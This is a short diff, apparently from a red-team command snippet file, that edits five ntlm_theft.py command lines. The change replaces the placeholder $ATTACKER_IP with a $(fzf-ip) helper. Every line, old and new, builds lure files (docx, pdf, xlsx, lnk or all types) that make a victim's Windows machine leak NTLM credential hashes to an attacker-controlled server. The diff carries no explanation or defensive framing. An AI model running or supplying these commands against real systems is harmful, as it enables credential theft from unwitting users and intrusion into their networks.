@@ -1,5 +1,5 @@
-ntlm_theft.py -g all -s $ATTACKER_IP -f stolen
-ntlm_theft.py -g docx -s $ATTACKER_IP -f document
-ntlm_theft.py -g pdf -s $ATTACKER_IP -f document
-ntlm_theft.py -g xlsx -s $ATTACKER_IP -f document
-ntlm_theft.py -g lnk -s $ATTACKER_IP -f shortcut
+ntlm_theft.py -g all -s $(fzf-ip) -f stolen
+ntlm_theft.py -g docx -s $(fzf-ip) -f document
+ntlm_theft.py -g pdf -s $(fzf-ip) -f document
+ntlm_theft.py -g xlsx -s $(fzf-ip) -f document
+ntlm_theft.py -g lnk -s $(fzf-ip) -f shortcut
